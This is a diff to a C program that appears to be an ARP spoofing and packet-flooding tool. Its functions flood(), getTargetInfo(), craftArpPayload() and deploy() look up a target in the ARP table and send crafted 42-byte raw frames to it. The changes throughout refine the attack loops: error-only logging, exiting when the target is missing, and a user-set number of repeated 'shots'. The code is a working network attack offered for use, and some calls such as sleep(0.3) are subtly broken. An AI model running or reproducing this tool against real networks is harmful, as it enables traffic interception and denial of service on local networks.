@@ -228,9 +228,11 @@ void flood(){
                 scanf("%d",&no_payloads);
                 for(int x=0; x <= no_payloads; x++ ){
                     int status = send(newSock, payload, sizeof(payload), 0);
-                    printf("\n Deploy payload :%d, payload Size :%d, errorCode:%d",x,status,errno);
-                    if(status < 0)
+                    
+                    if(status < 0){
+                      printf("\n Deploy payload :%d, payload Size :%d, errorCode:%d",x,status,errno);
                       break;
+                      }
                 }
             } 
         }   
@@ -472,10 +474,12 @@ void getTargetInfo(unsigned char * target){
       if(!targetFound){
        //boradcast arp request
        printf("\n Target Not found in ARP Tabel.");
-       craftArpPayload(target_bin,1);
+       exit(0);
+       //craftArpPayload(target_bin,1);
       }
       else{
-        craftArpPayload(target_bin,0);
+        
+         craftArpPayload(target_bin,0);
       }
 
     }
@@ -486,11 +490,13 @@ void getTargetInfo(unsigned char * target){
 
 //Patern Match
 int find(char *buffer, char *pattern, int len){
+  //here 0x20 is 'space' charecter in assci
    for(int i=0; i<len; i++){
       //printf("\n matcheing => %c == %c",buffer[i],pattern[i]); //Debug
-       if(buffer[i] != pattern[i] && buffer[i] != 0x20){
+      if(pattern[i] != 0x00 && buffer[i] != 0x20){
+        if(buffer[i] != pattern[i])
           return 0;
-         }
+      }
    }
    return 1;
 } 
@@ -632,20 +638,18 @@ void deploy(unsigned char *payload, int payloadSize){
         // int status = sendto(newSock, payload, sizeof(payload), 0,  (struct sockaddr*)&ll_sock_disc, sizeof(ll_sock_disc));
         //int status = send(newSock, &payload, payloadSize,0);
         
-        int loocked = 0;
-        printf("\n\n single shot :0 \n keep it loocked :1\n");
-        scanf("%d",&loocked);
+        int shots = 0;
+        // printf("\n\n single shot :0 \n keep it loocked :1\n");
+        printf("\n\n Shots :");
+        scanf("%d",&shots);
         int status = 0;
-        if(loocked){
-          while( status != -1){
+        while(shots != 0){
             status = send(newSock, payload, 42, 0);
-            printf("\n Deploy status : %d, errorCode : %d\n",status,errno);
-            sleep(0.5);
-          }
+            // printf("\n Deploy status : %d, errorCode : %d\n shots :%d\n",status,errno,shots);
+            sleep(0.3);
+            shots--;
         }
-        else{
-          status = send(newSock, payload, 42, 0);
-        }
+        
 
         if(status == -1)
         printf("\n\n Deploy status :%d, errorNo:%d\n",status,errno);
